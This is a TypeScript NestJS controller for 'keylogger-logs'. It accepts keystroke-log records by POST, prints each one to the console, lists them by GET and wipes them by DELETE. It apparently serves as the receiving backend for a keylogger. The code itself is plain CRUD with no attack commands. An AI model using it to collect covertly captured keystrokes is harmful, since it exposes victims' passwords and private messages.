import { Controller, Post, Body, Get, Delete } from '@nestjs/common';
import { KeyloggerLogsService } from './keylogger-logs.service';
import { KeyloggerLog } from './keylogger-log.entity';

@Controller('keylogger-logs')
export class KeyloggerLogsController {
  constructor(private readonly keyloggerLogsService: KeyloggerLogsService) {}

  @Post()
  async create(@Body() body: Partial<KeyloggerLog>) {
    console.log('[POST /keylogger-logs] Body:', body);
    return this.keyloggerLogsService.create(body);
  }

  @Get()
  async findAll() {
    return this.keyloggerLogsService.findAll();
  }

  @Delete()
  async clear() {
    return this.keyloggerLogsService.clear();
  }
}
